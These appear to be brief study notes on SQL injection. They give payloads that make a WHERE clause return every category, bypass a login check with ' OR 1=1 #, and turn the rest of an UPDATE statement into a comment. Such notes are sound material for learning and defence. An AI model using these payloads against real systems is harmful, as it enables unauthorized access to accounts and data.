# sqli in WHERE clause

source:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

result:

`SELECT * FROM products WHERE category = ''+OR+1=1-- AND released = 1`

will get every category.

# allowing login bypass

* `'`  to close the expected string.
* `OR 1=1 #` is always true.
* password can be anything because it's escaped.

  result:
  `SELECT * FROM users WHERE username = '' OR 1=1 # AND password = 'input_password';`

* abusing UPDATE statement.
  `WHERE eid = 'EID5002' #' and pass word= 'xyz'`: everything after `#` is a comment.